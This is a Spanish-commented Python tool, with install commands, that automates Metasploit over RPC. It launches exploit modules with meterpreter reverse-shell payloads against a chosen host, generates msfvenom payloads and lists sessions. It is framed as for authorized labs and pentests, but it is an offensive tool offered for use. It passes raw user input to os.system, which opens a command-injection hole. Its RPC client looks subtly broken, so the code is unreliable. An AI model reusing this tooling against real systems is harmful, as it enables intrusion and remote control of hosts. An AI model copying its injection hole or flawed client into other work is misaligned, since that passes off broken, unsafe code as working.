sudo apt update && sudo apt install metasploit-framework python3-pip -y
pip install msgpack-python

msfrpcd -P tu_clave_rpc -S

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Herramienta de automatización para Metasploit en Kali
Autora: Zyanetralys
Uso autorizado: Laboratorio, CTFs, Pentests con contrato
"""

import os
import sys
import json
import time
import msgpack
import pathlib
from subprocess import Popen
from getpass import getpass
from typing import Dict, Any
from datetime import datetime
from socket import socket, AF_INET, SOCK_STREAM

CONFIG_DIR = pathlib.Path.home() / ".msf_tool"
CONFIG_FILE = CONFIG_DIR / "profiles.json"
LOG_FILE = CONFIG_DIR / "msf_tool.log"

DEFAULT_PROFILE = {
    "name": "default",
    "authorized_execution": False,
    "rpc_user": "msf",
    "rpc_pass": "changeme",
    "rpc_host": "127.0.0.1",
    "rpc_port": 55553,
    "lhost": "127.0.0.1",
    "lport": 4444,
    "payload": "linux/x86/meterpreter/reverse_tcp"
}

CONFIG_DIR.mkdir(exist_ok=True)
if not CONFIG_FILE.exists():
    with open(CONFIG_FILE, "w") as f:
        json.dump({"default": DEFAULT_PROFILE}, f, indent=2)

def log(msg: str):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now().isoformat()}] {msg}\n")

def load_profiles() -> Dict[str, Any]:
    with open(CONFIG_FILE, "r") as f:
        return json.load(f)

def save_profiles(profiles: Dict[str, Any]):
    with open(CONFIG_FILE, "w") as f:
        json.dump(profiles, f, indent=2)

def rpc_call(sock: socket, method: str, params: list):
    req = msgpack.packb({"method": method, "params": params, "id": 1})
    sock.send(req)
    resp = msgpack.unpackb(sock.recv(8192))
    return resp

def connect_rpc(profile):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.connect((profile["rpc_host"], profile["rpc_port"]))
    rpc_call(sock, "auth.login", [profile["rpc_user"], profile["rpc_pass"]])
    return sock

def confirm_execution():
    c = input("⚠ Confirmar ejecución real (yes): ")
    return c.strip().lower() == "yes"

def menu():
    profiles = load_profiles()
    profile = profiles["default"]

    while True:
        print("\n=== MSF TOOL ===")
        print("1) Cambiar perfil")
        print("2) Ejecutar módulo exploit")
        print("3) Generar payload con msfvenom")
        print("4) Listar sesiones activas")
        print("5) Salir")
        choice = input("> ").strip()

        if choice == "1":
            print("Perfiles disponibles:")
            for p in profiles:
                print(f" - {p}")
            sel = input("Selecciona perfil: ").strip()
            if sel in profiles:
                profile = profiles[sel]
                print(f"Perfil cambiado a: {sel}")
        elif choice == "2":
            if not profile.get("authorized_execution", False):
                print("❌ Ejecución real no autorizada en este perfil.")
                continue
            if not confirm_execution():
                continue
            module = input("Módulo exploit (ej: exploit/multi/handler): ").strip()
            rhost = input("RHOST: ").strip()
            rport = input("RPORT: ").strip()
            sock = connect_rpc(profile)
            rpc_call(sock, "module.use", ["exploit", module])
            rpc_call(sock, "module.set", [module, "RHOST", rhost])
            rpc_call(sock, "module.set", [module, "RPORT", rport])
            rpc_call(sock, "module.set", [module, "PAYLOAD", profile["payload"]])
            rpc_call(sock, "module.set", [module, "LHOST", profile["lhost"]])
            rpc_call(sock, "module.set", [module, "LPORT", str(profile["lport"])])
            rpc_call(sock, "module.execute", [module, {}])
            print("✅ Exploit lanzado.")
            log(f"Exploit {module} contra {rhost}:{rport}")
            sock.close()
        elif choice == "3":
            payload = input(f"Payload [{profile['payload']}]: ").strip() or profile["payload"]
            lhost = input(f"LHOST [{profile['lhost']}]: ").strip() or profile["lhost"]
            lport = input(f"LPORT [{profile['lport']}]: ").strip() or str(profile["lport"])
            out = input("Fichero salida: ").strip() or "payload.bin"
            cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f elf -o {out}"
            if confirm_execution():
                os.system(cmd)
                log(f"Payload generado: {out}")
                print(f"✅ Payload generado en {out}")
        elif choice == "4":
            sock = connect_rpc(profile)
            sessions = rpc_call(sock, "session.list", [])
            for sid, data in sessions.items():
                print(f"ID: {sid} | Tipo: {data['type']} | Host: {data['tunnel_peer']}")
            sock.close()
        elif choice == "5":
            sys.exit(0)
        else:
            print("Opción inválida.")

if __name__ == "__main__":
    menu()
